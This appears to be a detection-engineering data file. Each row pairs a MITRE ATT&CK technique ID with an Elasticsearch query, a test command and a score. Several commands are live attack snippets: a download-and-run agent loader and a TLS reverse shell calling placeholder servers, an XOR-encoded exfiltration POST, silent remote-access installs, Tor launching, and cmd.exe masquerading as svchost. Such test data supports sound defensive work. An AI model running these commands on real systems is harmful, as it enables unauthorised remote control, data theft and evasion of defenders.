T1219,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""LogMeInIgnition.msi""}},
                            {""match_phrase"":{""CommandLine"": ""Start-Process""}},
                            {""match_phrase"":{""CommandLine"": ""LMIIgnition.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; 
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""; 
Start-Process -Wait $file1 /quiet; 
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""",2（4）
T1105,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.WebClient""}},
                        {""wildcard"":{""CommandLine"": ""*.Headers.add""}},
                        {""wildcard"":{""CommandLine"": ""*.DownloadData""}},
                        {""term"":{""CommandLine"": ""manx.go""}},
                        {""wildcard"":{""CommandLine"": ""*.ResponseHeaders""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""get-process""}},
                        {""match_phrase"": {""CommandLine"": ""stop-process""}},
                        {""match_phrase"": {""CommandLine"": ""Start-Process""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if ($host.Version.Major -ge 3){$ErrAction= ""ignore""}else{$ErrAction= ""SilentlyContinue""};
$server=""#{app.contact.http}"";
$socket=""#{app.contact.tcp}"";
$contact=""tcp"";
$url=""$server/file/download"";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add(""platform"",""windows"");
$wc.Headers.add(""file"",""manx.go"");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""","""");
Get-Process | ? {$_.Path -like ""C:\Users\Public\$name.exe""} | stop-process -f -ea $ErrAction;
rm -force ""C:\Users\Public\$name.exe"" -ea $ErrAction;
([io.file]::WriteAllBytes(""C:\Users\Public\$name.exe"",$data)) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList ""-socket $socket -http $server -contact $contact"" -WindowStyle hidden;",2（4）
T1573,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""New-Object Net.Sockets.TcpClient""}},
                        {""wildcard"":{""CommandLine"": ""*.GetStream""}},
                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.Security.SslStream""}},
                        {""wildcard"":{""CommandLine"": ""*.AuthenticateAsClient""}},
                        {""match_phrase"": {""CommandLine"": ""New-Object System.IO.StreamWriter""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""System.Text.ASCIIEncoding""}},
                        {""wildcard"":{""CommandLine"": ""*.Write""}},
                        {""wildcard"":{""CommandLine"": ""*.Flush""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$server_ip =; $server_port =; 
$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); 
$stream = $socket.GetStream(); 
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); 
$sslStream.AuthenticateAsClient('fake.domain', $null, ""Tls12"", $false); 
$writer = new-object System.IO.StreamWriter($sslStream); 
$writer.Write('PS ' + (pwd).Path + '> '); 
$writer.flush(); 
[byte[]]$bytes = 0..65535|%{0}; 
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); 
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
$sendback = (iex $data | Out-String ) 2>&1; 
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; 
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
$sslStream.Write($sendbyte,0,$sendbyte.Length);
$sslStream.Flush()}",4
T1090.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                        {""wildcard"":{""CommandLine"": ""start*""}},
                        {""match_phrase"":{""CommandLine"": ""psiphon3.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","start %USERPROFILE%\Downloads\psiphon3.exe
timeout /t 20 >nul 2>&1
Taskkill /IM msedge.exe /F >nul 2>&1
Taskkill /IM psiphon3.exe /F >nul 2>&1
Taskkill /IM psiphon-tunnel-core.exe /F >nul 2>&1",2（4）
T1219,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                        {""wildcard"":{""CommandLine"": ""ScreenConnect*""}},
                        {""wildcard"":{""CommandLine"": ""*msi""}},
                        {""match_phrase"":{""CommandLine"": ""msiexec //i""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""; 
Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi""; msiexec /i $installer /qn",4 (日志被不全)
T1219,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""Start-Process""}},
                            {""match_phrase"":{""CommandLine"": ""TeamViewer.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; 
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\TeamViewer_Setup.exe""; 
Start-Process -Wait $file1 /S; 
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'",2（4）
T1571,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Test-NetConnection""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""-ComputerName""}},
                        {""match_phrase"": {""CommandLine"": ""-port""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Test-NetConnection -ComputerName google.com -port 8081,2
T1090.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""tor.exe""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""invoke-expression""}},
                        {""match_phrase"": {""CommandLine"": ""stop-process""}},
                        {""match_phrase"": {""CommandLine"": ""start powershell""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","invoke-expression 'cmd /c start powershell -Command {cmd /c $env:temp\tor\Tor\tor.exe}'; 
sleep -s 60; 
stop-process -name ""tor"" | out-null",2（4）
T1105,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        
                        {""match"": {""CommandLine"": ""if""}}
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                         {""wildcard"":{""CommandLine"": ""bitsadmin*""}},
                        {""match_phrase"": {""CommandLine"": "" /transfer""}},
                         {""match_phrase"": {""CommandLine"": ""/Priority""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt,2
T1105,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""New-Object Net.WebClient""}},
                    {""wildcard"": {""CommandLine"": ""Download*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", ""$env:TEMP\Atomic-license.txt"")

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt",2(4)
T1132.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
                        {""match"": {""CommandLine"": ""-bxor""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""-Method""}},
                        {""match"": {""CommandLine"": ""-Ur""}},
                        {""match"": {""CommandLine"": ""-Method""}},
                        {""match"": {""CommandLine"": ""-DisableKeepAlive""}},
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim"")); 
$key = ""abcdefghijklmnopqrstuvwxyz123456""; 
$cyphertext =  @(); 
for ($i = 0; $i -lt $plaintext.Count; $i++) {;
$cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; 
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; 
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive",2（4）
T1090.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""netsh*""}},
                        {""match_phrase"": {""CommandLine"": ""interface portproxy add""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""term"": {""CommandLine"": ""listenport""}},
                        {""term"": {""CommandLine"": ""connectport""}},
                        {""term"": {""CommandLine"": ""connectaddress""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1,2
T1105,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""svchost.exe""}},
                        {""match_phrase"": {""CommandLine"": ""System32\\cmd.exe""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""copy""}},
                        {""match_phrase"": {""CommandLine"": ""copy-item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy C:\Windows\System32\cmd.exe C:\svchost.exe 
&& C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt

copy-item C:\Windows\System32\cmd.exe C:\svchost.exe",2
